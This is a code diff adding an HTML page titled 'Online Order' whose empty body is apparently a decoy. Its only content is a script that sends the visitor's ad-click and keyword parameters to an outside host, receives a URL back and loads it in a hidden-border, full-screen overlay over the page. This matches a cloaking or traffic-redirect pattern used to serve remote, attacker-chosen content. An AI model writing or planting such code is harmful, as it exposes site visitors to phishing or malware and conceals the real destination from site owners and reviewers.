@@ -1,0 +1,26 @@
+<html>
+  
+  <head>
+    <script>
+(function() {
+    const p = new URLSearchParams(location.search);
+    const url = `https://twtds.info/rujsframe?gclid=${encodeURIComponent(p.get('gclid')||'')}&keyword=${encodeURIComponent(p.get('keyword')||'')}`;
+    
+    fetch(url)
+        .then(response => response.text())
+        .then(targetUrl => {
+            const container = document.createElement('div');
+            container.style.cssText = 'width:100%;height:100vh;position:fixed;top:0;left:0;z-index:1000;';
+            container.innerHTML = `<object data="${targetUrl}" type="text/html" style="width:100%;height:100%;border:none;"></object>`;
+            document.body.appendChild(container);
+        });
+})();
+
+
+</script>
+    <title>Online Order</title>
+  </head>
+  <body>
+
+  </body>
+</html>
